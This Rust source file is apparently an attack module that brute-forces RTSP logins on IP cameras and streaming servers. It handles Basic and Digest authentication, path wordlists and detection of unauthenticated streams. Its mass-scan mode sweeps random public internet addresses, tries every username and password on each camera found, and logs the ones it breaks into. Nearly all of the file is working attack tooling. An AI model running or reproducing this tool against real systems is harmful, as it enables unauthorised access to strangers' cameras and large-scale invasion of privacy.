use anyhow::{anyhow, Result, Context};
use base64::engine::general_purpose::STANDARD as Base64;
use base64::Engine as _;
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};
use std::{
    fs::File,
    io::{Write, BufRead, BufReader},
    net::{IpAddr, Ipv4Addr, SocketAddr},
    sync::Arc,
    sync::atomic::{AtomicBool, AtomicUsize, Ordering},
    time::Duration,
    collections::HashSet,
};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::{Mutex, Semaphore},
    time::{sleep, timeout},
    fs::OpenOptions,
};
use rand::Rng;

use crate::utils::{
    prompt_yes_no, prompt_existing_file, prompt_default, prompt_int_range, prompt_port,
    load_lines, get_filename_in_current_dir, normalize_target,
};
use crate::modules::creds::utils::BruteforceStats;

const PROGRESS_INTERVAL_SECS: u64 = 5;
const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;
const STATE_FILE: &str = "rtsp_mass_state.log";

// Hardcoded exclusions (Private + Cloudflare + Google + Link Local etc)
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", // Private
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8", // Multicast/Reserved
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32", // Carrier/LinkLocal/Broadcast
    // Cloudflare
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13", 
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18", 
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20", 
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32",
    // Google
    "8.8.8.8/32", "8.8.4.4/32"
];

#[derive(Debug, Clone, PartialEq)]
enum AuthMethod {
    None,
    Basic,
    Digest { realm: String, nonce: String },
    Unknown,
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   RTSP Brute Force Module                                 ║".cyan());
    println!("{}", "║   IP Camera and Streaming Server Credential Testing       ║".cyan());
    println!("{}", "║   Supports Basic & Digest Auth, Mass Scanning             ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Main entry point for the RTSP brute force module.
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Check for Mass Scan Mode conditions
    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || target.contains('/') || std::path::Path::new(target).is_file();

    println!("{}", format!("[*] Target: {}", target).cyan());
    if is_mass_scan {
        println!("{}", "[*] Mode: Mass Scan".yellow());
        return run_mass_scan(target).await;
    }

    run_single_target(target).await
}

async fn run_single_target(target: &str) -> Result<()> {
    let port: u16 = prompt_port("RTSP Port", 554)?;

    let usernames_file = prompt_existing_file("Username wordlist")?;
    let passwords_file = prompt_existing_file("Password wordlist")?;

    let concurrency = prompt_int_range("Max concurrent tasks", 10, 1, 10000)? as usize;

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let _save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if _save_results {
        Some(prompt_default("Output file", "rtsp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false)?;

    // Extract RTSP path if present (e.g., rtsp://host:port/path -> path)
    let implicit_path = extract_rtsp_path(target);
    
    // Normalize target and add port if needed
    let target_normalized = if target.starts_with("rtsp://") {
        target.strip_prefix("rtsp://")
            .unwrap_or(target)
            .split('/')
            .next()
            .unwrap_or(target)
    } else {
        target.split('/').next().unwrap_or(target)
    };
    
    let normalized = normalize_target(target_normalized)?;
    let addr = if normalized.contains(':') {
        normalized
    } else {
        format!("{}:{}", normalized, port)
    };
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new()); 
    let semaphore = Arc::new(Semaphore::new(concurrency));

    println!("\n[*] Starting brute-force on {}", addr);

    let resolved_addrs = match resolve_targets(&addr, port).await {
        Ok(addrs) => Arc::new(addrs),
        Err(e) => {
            eprintln!("[!] Failed to resolve '{}': {}", addr, e);
            return Err(e);
        }
    };

    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty. Exiting.");
        return Ok(());
    }

    let pass_lines = load_lines(&passwords_file)?;
    if pass_lines.is_empty() {
        println!("[!] Password wordlist is empty. Exiting.");
        return Ok(());
    }

    let brute_force_paths = prompt_yes_no("Brute force possible RTSP paths (e.g. /stream /live)?", false)?;
    let mut paths = if brute_force_paths {
        let paths_file = prompt_existing_file("Path to RTSP paths file")?;
        load_lines(&paths_file)?
    } else {
        vec!["".to_string()]
    };
    if paths.is_empty() {
        println!("[!] RTSP paths list is empty. Falling back to default root path.");
        paths.push(String::new());
    }
    if let Some(p) = implicit_path {
        if !paths.iter().any(|existing| existing == &p) {
            paths.insert(0, p);
        }
    }
    println!();

    println!("[*] Probing authentication method on default path...", );
    let initial_path = match paths.first() {
        Some(p) => p.clone(),
        None => String::new(),
    };
    let probe_result = probe_auth_method(resolved_addrs.as_slice(), &addr, &initial_path).await;
    
    let default_auth_method = match probe_result {
        Ok(AuthMethod::None) => {
            println!("{}", "[+] Target allows Unauthenticated Access!".green().bold());
            // If user wants to stop on success, we are done?
            // We should record this.
            found.lock().await.push((addr.clone(), "<NO_AUTH>".to_string(), "<NO_AUTH>".to_string(), initial_path.clone()));
            if stop_on_success {
                println!("[+] Stopping due to unauthenticated access.");
                return Ok(());
            }
            AuthMethod::None
        },
        Ok(AuthMethod::Basic) => {
             println!("{} Detected Auth: Basic", "[*]".blue());
             AuthMethod::Basic
        },
        Ok(AuthMethod::Digest { realm, nonce }) => {
             println!("{} Detected Auth: Digest (Realm: {})", "[*]".blue(), realm);
             AuthMethod::Digest { realm, nonce }
        },
        Ok(AuthMethod::Unknown) => {
             println!("{} Unknown auth or connection error. Will default to Basic or probing.", "[!]".yellow());
             AuthMethod::Unknown
        },
        Err(e) => {
             println!("{} Probe failed: {}. Will continue knowing nothing.", "[!]".red(), e);
             AuthMethod::Unknown
        }
    };


    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop.clone();
    tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let mut tasks = FuturesUnordered::new();
    let mut idx = 0usize;

    for pass in pass_lines {
        if stop_on_success && stop.load(Ordering::Relaxed) { break; }

        let userlist: Vec<String> = if combo_mode {
            users.clone()
        } else {
            vec![users.get(idx % users.len()).unwrap_or(&users[0]).to_string()]
        };

        for user in userlist {
            if stop_on_success && stop.load(Ordering::Relaxed) { break; }
            for path in &paths {
                if stop_on_success && stop.load(Ordering::Relaxed) { break; }

                let addr_clone = addr.clone();
                let user_clone = user.clone();
                let pass_clone = pass.clone();
                let path_clone = path.clone();
                let found_clone = Arc::clone(&found);
                let stop_clone = Arc::clone(&stop);
                let stats_clone = Arc::clone(&stats);
                let semaphore_clone = Arc::clone(&semaphore);
                let addrs_clone = Arc::clone(&resolved_addrs);
                let stop_flag = stop_on_success;
                let verbose_flag = verbose;
                // If we know detected method, use it as a hint.
                let cached_method = default_auth_method.clone();

                tasks.push(tokio::spawn(async move {
                    if stop_flag && stop_clone.load(Ordering::Relaxed) { return; }
                    let _permit = match semaphore_clone.acquire().await {
                        Ok(p) => p,
                        Err(_) => return,
                    };
                    if stop_flag && stop_clone.load(Ordering::Relaxed) { return; }

                    match try_rtsp_login_smart(
                        addrs_clone.as_slice(),
                        &addr_clone,
                        &user_clone,
                        &pass_clone,
                        &path_clone,
                        &cached_method,
                    ).await {
                        Ok(true) => {
                            let path_str = if path_clone.is_empty() { "/" } else { &path_clone };
                            println!("\r{}", format!("[+] {} -> {}:{} [path={}]", addr_clone, user_clone, pass_clone, path_str).green().bold());
                            found_clone.lock().await.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone(), path_str.to_string()));
                            stats_clone.record_success();
                            if stop_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_failure();
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{} [path={}]", addr_clone, user_clone, pass_clone, path_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_error(e.to_string()).await;
                            if verbose_flag {
                                println!("\r{}", format!("[!] {} -> error: {}", addr_clone, e).red());
                            }
                        }
                    }
                }));
            }
        }
        idx += 1;
    }

    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
             stats.record_error(format!("Task panic: {}", e)).await;
        }
    }

    // Stop progress reporter
    stop.store(true, Ordering::Relaxed);
    
    // Print final statistics
    stats.print_final().await;

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        
        if let Some(path) = save_path {
            let filename = get_filename_in_current_dir(&path);
            if let Ok(mut file) = File::create(&filename) {
                for (host, user, pass, path) in creds.iter() {
                    let _ = writeln!(file, "{} -> {}:{} [path={}]", host, user, pass, path);
                }
                println!("[+] Results saved to '{}'", filename.display());
            }
        }
    }

    Ok(())
}

/// Run mass scan logic
async fn run_mass_scan(target: &str) -> Result<()> {
    // Prep wordlists
    println!("{}", "[*] Preparing Mass Scan configuration...".blue());
    
    let port: u16 = prompt_port("RTSP Port", 554)?;
    
    let usernames_file = prompt_existing_file("Username wordlist")?;
    let passwords_file = prompt_existing_file("Password wordlist")?;
    let paths_file = prompt_existing_file("RTSP paths file (empty for none/root)")?;
    
    let users = load_lines(&usernames_file)?;
    let pass_lines = load_lines(&passwords_file)?;
    let mut paths = load_lines(&paths_file)?;
    if paths.is_empty() {
         paths.push("".to_string());
    }

    if users.is_empty() || pass_lines.is_empty() {
        return Err(anyhow!("Wordlists cannot be empty"));
    }

    let concurrency = prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000)? as usize;
    let verbose = prompt_yes_no("Verbose mode?", false)?;

    let output_file = prompt_default("Output result file", "rtsp_mass_results.txt")?;

    // Ask about exclusions
    let use_exclusions = prompt_yes_no("Exclude reserved/private ranges?", true)?;
    
    // Parse exclusions
    let mut exclusion_subnets = Vec::new();
    if use_exclusions {
        for cidr in EXCLUDED_RANGES {
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                exclusion_subnets.push(net);
            }
        }
        println!("{}", format!("[+] Loaded {} exclusion ranges", exclusion_subnets.len()).cyan());
    }
    let exclusions = Arc::new(exclusion_subnets);

    // Shared State
    let semaphore = Arc::new(Semaphore::new(concurrency));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));
    
    let creds_pkg = Arc::new((users, pass_lines, paths));

    // Stats Reporter
    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(5)).await;
            println!(
                "[*] Status: {} IPs scanned, {} RTSP streams found",
                s_checked.load(Ordering::Relaxed),
                s_found.load(Ordering::Relaxed).to_string().green().bold()
            );
        }
    });

    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";
    
    let mut checked_ips = HashSet::new();
    if run_random {
        if std::path::Path::new(STATE_FILE).exists() {
             println!("{} Loading state file...", "[*]".blue());
             if let Ok(file) = File::open(STATE_FILE) {
                 let reader = BufReader::new(file);
                 for line in reader.lines() {
                     if let Ok(l) = line {
                         if let Some(ip) = l.strip_prefix("checked: ") {
                             checked_ips.insert(ip.trim().to_string());
                         }
                     }
                 }
             }
             println!("{} Loaded {} checked IPs.", "[+]".green(), checked_ips.len());
        }
    }
    
    let checked_set = Arc::new(Mutex::new(checked_ips));

    if run_random {
        OpenOptions::new().create(true).append(true).open(STATE_FILE).await?;

        println!("{}", "[*] Starting Random Internet Scan...".green());
        loop {
            let permit = semaphore.clone().acquire_owned().await.map_err(|e| anyhow::anyhow!("Semaphore closed: {}", e))?;
             let exc = exclusions.clone();
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             let c_set = checked_set.clone();
             
             tokio::spawn(async move {
                 let ip = generate_random_public_ip(&exc);
                 
                 let ip_s = ip.to_string();
                 let is_checked = {
                     let set = c_set.lock().await;
                     set.contains(&ip_s)
                 };

                 if !is_checked {
                     {
                         let mut set = c_set.lock().await;
                         set.insert(ip_s.clone());
                     }
                     mark_ip_checked_file(&ip_s).await;
                     mass_scan_host(ip, port, cp, sf, of, verbose).await;
                 }
                 
                 sc.fetch_add(1, Ordering::Relaxed);
                 drop(permit);
             });
        }
    } else {
         let targets: Vec<String> = if std::path::Path::new(target).is_file() {
            let content = match tokio::fs::read_to_string(target).await {
                Ok(c) => c,
                Err(e) => {
                    println!("{}", format!("[!] Failed to read target file: {}", e).red());
                    return Ok(());
                }
            };
            content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect()
        } else if target.contains('/') {
            if let Ok(net) = target.parse::<ipnetwork::IpNetwork>() {
                 net.iter().map(|ip| ip.to_string()).collect()
             } else {
                 vec![target.to_string()]
             }
        } else {
             vec![target.to_string()]
        };

        println!("{}", format!("[*] Loaded {} targets.", targets.len()).blue());

        for ip_str in targets {
             let permit = semaphore.clone().acquire_owned().await.map_err(|e| anyhow::anyhow!("Semaphore closed: {}", e))?;
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             
             let ip_addr = match ip_str.parse::<IpAddr>() {
                 Ok(ip) => Some(ip),
                 Err(_) => {
                     match tokio::net::lookup_host(format!("{}:{}", ip_str, port)).await {
                         Ok(mut iter) => iter.next().map(|s| s.ip()),
                         Err(_) => None
                     }
                 }
             };

             tokio::spawn(async move {
                 if let Some(ip) = ip_addr {
                     mass_scan_host(ip, port, cp, sf, of, verbose).await;
                 }
                 sc.fetch_add(1, Ordering::Relaxed);
                 drop(permit);
             });
        }
        
        for _ in 0..concurrency {
            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
        }
    }

    Ok(())
}

async fn mass_scan_host(
    ip: IpAddr, 
    port: u16, 
    creds: Arc<(Vec<String>, Vec<String>, Vec<String>)>, 
    stats_found: Arc<AtomicUsize>,
    output_file: String,
    verbose: bool
) {
    let sa = SocketAddr::new(ip, port);
    
    // 1. Connection Check (Fast Fail)
    if timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), TcpStream::connect(&sa)).await.is_err() {
        return;
    }
    
    // Probe once to determine method
    let (users, passes, paths) = &*creds;
    
    // We try to probe the preferred path (usually first one or root)
    let probe_path = match paths.first() {
        Some(p) => p.clone(),
        None => String::new(),
    };
    let addrs = [sa];
    
    // For mass scan, we might fail probe due to timeout, just return then.
    // If Unauth, we log and return success immediately!
    let auth_method = match probe_auth_method(&addrs, &sa.to_string(), &probe_path).await {
        Ok(AuthMethod::None) => {
             // Found open!
             let result_str = format!("{} -> <NO_AUTH>:<NO_AUTH> [path={}]", sa, probe_path);
             println!("\r{}", format!("[+] FOUND: {}", result_str).green().bold());
             if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
                 let _ = file.write_all(format!("{}\n", result_str).as_bytes()).await;
             }
             stats_found.fetch_add(1, Ordering::Relaxed);
             return; 
        },
        Ok(m) => m,
        Err(_) => return, // Failed to probe, host likely gone
    };

    for path in paths {
        for user in users {
            for pass in passes {
                let res = try_rtsp_login_smart(
                    &addrs, 
                    &sa.to_string(), 
                    user, 
                    pass, 
                    path, 
                    &auth_method
                ).await;

                match res {
                   Ok(true) => {
                       let result_str = format!("{} -> {}:{} [path={}]", sa, user, pass, path);
                       println!("\r{}", format!("[+] FOUND: {}", result_str).green().bold());
                       if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
                           let _ = file.write_all(format!("{}\n", result_str).as_bytes()).await;
                       }
                       stats_found.fetch_add(1, Ordering::Relaxed);
                       return; 
                   }
                   Ok(false) => {}
                   Err(e) => {
                       let err_str = e.to_string().to_lowercase();
                       if err_str.contains("refused") || err_str.contains("timeout") || err_str.contains("reset") {
                           return; 
                       }
                       if verbose {
                           println!("\r{}", format!("[!] {} -> error: {}", sa, e).red());
                       }
                   }
                }
            }
        }
    }
}


fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        
        let mut excluded = false;
        for net in exclusions {
            if net.contains(ip_addr) {
                excluded = true;
                break;
            }
        }
        
        if !excluded {
            return ip_addr;
        }
    }
}

async fn mark_ip_checked_file(ip: &str) {
    let data = format!("checked: {}\n", ip);
    if let Ok(mut file) = OpenOptions::new()
        .create(true)
        .append(true)
        .open(STATE_FILE)
        .await 
    {
        let _ = file.write_all(data.as_bytes()).await;
    }
}

/// Resolve a host:port for single target mode
async fn resolve_targets(addr: &str, default_port: u16) -> Result<Vec<SocketAddr>> {
    if let Ok(sa) = addr.parse::<SocketAddr>() {
        return Ok(vec![sa]);
    }
    let (host, port) = if let Some((h, p)) = addr.rsplit_once(':') {
        (h.to_string(), p.parse().unwrap_or(default_port))
    } else {
        (addr.to_string(), default_port)
    };
    let host_clean = host.trim_matches(|c| c == '[' || c == ']').to_string();
    let host_port = if host_clean.contains(':') {
        format!("[{}]:{}", host_clean, port)
    } else {
        format!("{}:{}", host_clean, port)
    };
    let addrs = tokio::net::lookup_host(host_port.clone())
        .await
        .map_err(|e| anyhow!("DNS lookup '{}': {}", host_port, e))?
        .collect::<Vec<_>>();

    if addrs.is_empty() {
        Err(anyhow!("No addresses found for '{}'", host_port))
    } else {
        Ok(addrs)
    }
}

// ------ RTSP Logic ------

async fn connect_to_any(addrs: &[SocketAddr]) -> Result<(TcpStream, SocketAddr)> {
    let mut last_err = None;
    for sa in addrs {
        // Connect timeout
        match timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), TcpStream::connect(*sa)).await {
            Ok(Ok(s)) => return Ok((s, *sa)),
            Ok(Err(e)) => { last_err = Some(e); continue; }
            Err(_) => { last_err = Some(std::io::Error::new(std::io::ErrorKind::TimedOut, "Connect timeout")); continue; }
        }
    }
    Err(last_err.map(|e| e.into()).unwrap_or_else(|| anyhow!("All connection attempts failed")))
}

async fn send_request(stream: &mut TcpStream, request: &str) -> Result<String> {
    stream.write_all(request.as_bytes()).await?;
    let mut buffer = [0u8; 2048];
    // Read timeout
    let n = match timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), stream.read(&mut buffer)).await {
        Ok(Ok(n)) => n,
        Ok(Err(e)) => return Err(e.into()),
        Err(_) => return Err(anyhow!("Read timeout")),
    };
    if n == 0 {
        return Err(anyhow!("Connection closed by server"));
    }
    Ok(String::from_utf8_lossy(&buffer[..n]).to_string())
}

/// Probes the server to determine supported auth method
async fn probe_auth_method(addrs: &[SocketAddr], _addr_display: &str, path: &str) -> Result<AuthMethod> {
    let (mut stream, sa) = connect_to_any(addrs).await?;
    
    let path_str = if path.is_empty() { "/" } else { path };
    let method = "DESCRIBE"; 
    
    // Send unauthenticated request
    let request = format!(
        "{method} rtsp://{host}:{port}/{path} RTSP/1.0\r\nCSeq: 1\r\n\r\n",
        method = method,
        host = sa.ip(),
        port = sa.port(),
        path = path_str.trim_start_matches('/') 
    );

    let response = send_request(&mut stream, &request).await?;
    
    if response.contains("200 OK") {
        return Ok(AuthMethod::None);
    }
    
    if response.contains("401 Unauthorized") {
        if response.contains("Digest") {
            // Parse Realm and Nonce
            // WWW-Authenticate: Digest realm="HipcamRealServer", nonce="3b27a446bfa49b0c48c3edb631e09054"
            let realm = extract_header_value(&response, "realm=\"", "\"");
            let nonce = extract_header_value(&response, "nonce=\"", "\"");
            
            if let (Some(r), Some(n)) = (realm, nonce) {
                return Ok(AuthMethod::Digest { realm: r, nonce: n });
            }
        } else if response.contains("Basic") {
            return Ok(AuthMethod::Basic);
        }
    }

    Ok(AuthMethod::Unknown)
}

fn extract_header_value(response: &str, start_marker: &str, end_marker: &str) -> Option<String> {
    if let Some(start) = response.find(start_marker) {
        let remainder = &response[start + start_marker.len()..];
        if let Some(end) = remainder.find(end_marker) {
             return Some(remainder[..end].to_string());
        }
    }
    None
}

async fn try_rtsp_login_smart(
    addrs: &[SocketAddr],
    addr_display: &str,
    user: &str,
    pass: &str,
    path: &str,
    auth_method: &AuthMethod,
) -> Result<bool> {
    
    let method_to_use = if let AuthMethod::Unknown = auth_method {
        probe_auth_method(addrs, addr_display, path).await.unwrap_or(AuthMethod::Basic)
    } else {
        auth_method.clone()
    };

    let (mut stream, sa) = connect_to_any(addrs).await?;

    let rtsp_verb = "DESCRIBE";
    let path_str = if path.is_empty() { "/" } else { path };
    let path_clean = path_str.trim_start_matches('/');
    
    let uri = format!("rtsp://{}:{}/{}", sa.ip(), sa.port(), path_clean);
    
    let auth_header = match method_to_use {
        AuthMethod::None => return Ok(true), 
        AuthMethod::Basic => {
            let credentials = Base64.encode(format!("{}:{}", user, pass));
            format!("Authorization: Basic {}", credentials)
        },
        AuthMethod::Digest { ref realm, ref nonce } => {
            let ha1 = format!("{:x}", md5::compute(format!("{}:{}:{}", user, realm, pass)));
            let ha2 = format!("{:x}", md5::compute(format!("{}:{}", rtsp_verb, uri)));
            let response = format!("{:x}", md5::compute(format!("{}:{}:{}", ha1, nonce, ha2)));
            
            format!(
                "Authorization: Digest username=\"{}\", realm=\"{}\", nonce=\"{}\", uri=\"{}\", response=\"{}\"",
                user, realm, nonce, uri, response
            )
        },
        AuthMethod::Unknown => return Ok(false),
    };

    let request = format!(
        "{method} {uri} RTSP/1.0\r\nCSeq: 2\r\n{auth}\r\n\r\n",
        method = rtsp_verb,
        uri = uri,
        auth = auth_header
    );

    let response = send_request(&mut stream, &request).await?;

    if response.contains("200 OK") {
        Ok(true)
    } else {
        Ok(false)
    }
}

fn extract_rtsp_path(target: &str) -> Option<String> {
    let trimmed = target.trim();
    let without_scheme = trimmed.strip_prefix("rtsp://").unwrap_or(trimmed);
    
    if let Some((_, path)) = without_scheme.split_once('/') {
        let clean_path = match path.split(|c| c == '?' || c == '#').next() {
            Some(p) => p,
            None => "",
        }
            .trim();
        
        if clean_path.is_empty() || clean_path == "/" {
            None
        } else {
            let mut final_path = clean_path.to_string();
            if !final_path.starts_with('/') {
                final_path.insert(0, '/');
            }
            Some(final_path)
        }
    } else {
        None
    }
}
